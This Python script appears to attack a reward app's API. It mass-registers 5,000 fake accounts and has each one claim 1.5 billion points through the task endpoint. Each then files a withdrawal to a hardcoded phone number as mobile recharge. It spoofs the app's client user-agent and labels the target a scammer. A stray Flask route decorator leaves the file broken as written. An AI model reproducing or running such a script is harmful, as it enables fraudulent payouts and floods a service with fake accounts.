import asyncio
import aiohttp
import json
import random
import string
import uuid
from time import time
import requests
from flask import Flask

app = Flask(__name__)

@app.route("/api")


# Function to generate a random email
def generate_random_email():
    domains = ["example.com", "test.com", "random.com"]
    random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    return f"{random_string}@{random.choice(domains)}"

# Function to generate a random name
def generate_random_name():
    first_names = ["John", "Jane", "Alice", "Bob", "Charlie", "Eve"]
    last_names = ["Doe", "Smith", "Johnson", "Brown", "Williams", "Jones"]
    return f"{random.choice(first_names)} {random.choice(last_names)}"

async def register_and_get_token(session):
    url = "https://takagorapi.takagor.com/public/api/v1/register-google"
    payload = json.dumps({
        "android_id": str(uuid.uuid4()),  # Generate a random UUID for android_id
        "email": generate_random_email(),
        "name": " Taka chor scamer"
    })
    headers = {
        'User-Agent': "okhttp/5.0.0-alpha.2",
        'Accept-Encoding': "gzip",
        'content-type': "application/json; charset=UTF-8"
    }
    async with session.post(url, data=payload, headers=headers) as response:
        if response.status == 200:
            data = await response.json()
            print(f"Register Response: {data}")
            return data.get("token")
        else:
            print(f"Failed to register: {await response.text()}")
            return None

async def store_task(session, token):
    url = "https://takagorapi.takagor.com/public/api/v1/store-task"
    payload = json.dumps({
        "point": "1500000000",
        "position": "15",
        "task_type": "3"
    })
    headers = {
        'User-Agent': "okhttp/5.0.0-alpha.2",
        'Accept-Encoding': "gzip",
        'authorization': f"Bearer {token}",
        'content-type': "application/json; charset=UTF-8"
    }
    async with session.post(url, data=payload, headers=headers) as response:
        data = await response.text()
        if response.status == 200:
            print(f"Store Task Response: {data}")
        else:
            print(f"Failed to store task: {data}")

async def withdraw_request(session, token):
    url = "https://takagorapi.takagor.com/public/api/v1/withdraw-request"
    payload = json.dumps({
        "account_info": "01729832428",
        "amount": "500",
        "method_id": "3",
        "method_name": "মোবাইল রিচার্জ"
    })
    headers = {
        'User-Agent': "okhttp/5.0.0-alpha.2",
        'Accept-Encoding': "gzip",
        'authorization': f"Bearer {token}",
        'content-type': "application/json; charset=UTF-8"
    }
    async with session.post(url, data=payload, headers=headers) as response:
        data = await response.text()
        if response.status == 200:
            print(f"Withdraw Request Response: {data}")
        else:
            print(f"Failed to withdraw: {data}")

async def register_and_store_task(session):
    token = await register_and_get_token(session)
    if token:
        await store_task(session, token)
        await withdraw_request(session, token)

async def make_requests():
    async with aiohttp.ClientSession() as session:
        tasks = []
        for _ in range(5000):
            tasks.append(register_and_store_task(session))
        await asyncio.gather(*tasks)

start_time = time()
asyncio.run(make_requests())
end_time = time()

print(f"Completed in {end_time - start_time} seconds")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8230, debug=True)
    
    

